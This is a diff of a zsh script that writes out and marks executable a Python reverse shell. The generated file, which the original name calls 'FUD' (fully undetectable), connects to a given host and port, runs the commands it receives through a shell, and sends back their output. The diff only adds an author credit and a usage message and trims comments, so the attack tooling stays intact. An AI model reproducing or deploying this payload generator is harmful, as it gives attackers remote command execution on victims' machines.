@@ -1,8 +1,11 @@
 #!/bin/zsh
+# Written by Felix Hellmich
 
 # create output file and set file name 
-if [[ $3 == '' ]]; then file="/tmp/FUD-rshell_payload"; else file="$3"; fi; touch $file
-# create payload
+if [[ $3 == '' ]]; then file="/tmp/payload.py"; else file="$3"; fi; touch $file
+# show usage if needed
+[[ $1 == '' || $1 == '-h' || $1 == '--help' ]] && echo "usage: <HOST> <PORT> </path/to/file(default is /tmp/payload.py)>"
+# write payload
 echo "#!/usr/bin/python3" >> $file
 echo -e "\n" >> $file
 echo "import socket, subprocess" >> $file
@@ -17,7 +20,7 @@ echo "	proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE,stderr=s
 echo "	stdout_value = proc.stdout.read() + proc.stderr.read()" >> $file
 echo "	s.send(stdout_value)" >> $file
 echo "s.close()" >> $file
-# print status (success/error)
+# print status
 [[ -f $file ]] && echo "Successfully created reverse shell payload in $file ..." &&
-	chmod +x $file # give r:w:x rights to the file
+	chmod +x $file # give rights
 [[ ! -f $file ]] && echo "script:err: An error occured during the process of creating $file ..." && break
